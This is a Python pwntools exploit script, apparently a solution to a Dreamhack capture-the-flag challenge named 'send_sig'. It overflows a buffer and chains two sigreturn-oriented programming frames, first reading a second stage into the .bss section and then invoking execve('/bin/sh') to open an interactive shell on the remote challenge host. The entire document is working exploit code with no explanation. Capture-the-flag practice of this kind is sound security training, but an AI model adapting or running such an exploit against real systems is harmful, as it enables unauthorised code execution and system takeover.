#!/usr/bin/python3

from pwn import *

#p = process("./send_sig")
p = remote("host1.dreamhack.games", 14144)
e = ELF("./send_sig")
context.arch = 'amd64'
#context.log_level = 'debug'

padding = "A"*0x10
sr = 0x004010b0 # syscall ; ret
p1r = 0x004010ae # pop rax; ret
signal = "Signal:"

# SROP Frame1

frame1 = SigreturnFrame()
frame1.rax = 0x0
frame1.rdi = 0x0
frame1.rsi = e.bss() + 0x20
frame1.rdx = 0x1000
frame1.rip = sr
frame1.rsp = e.bss() + 0x20

payload = padding.encode('utf-8')
payload += p64(p1r)
payload += p64(0xf)
payload += p64(sr)
payload += bytes(frame1)

p.sendlineafter(signal, payload)

# SROP Frame 2

frame2 = SigreturnFrame()
frame2.rax = 0x3b
frame2.rdi = e.bss() + 0x110 + 0x20
frame2.rip = sr

payload = p64(p1r)
payload += p64(0xf)
payload += p64(sr)
payload += bytes(frame2)
payload += "/bin/sh\x00".encode('utf-8')

p.sendline(payload)

p.interactive()
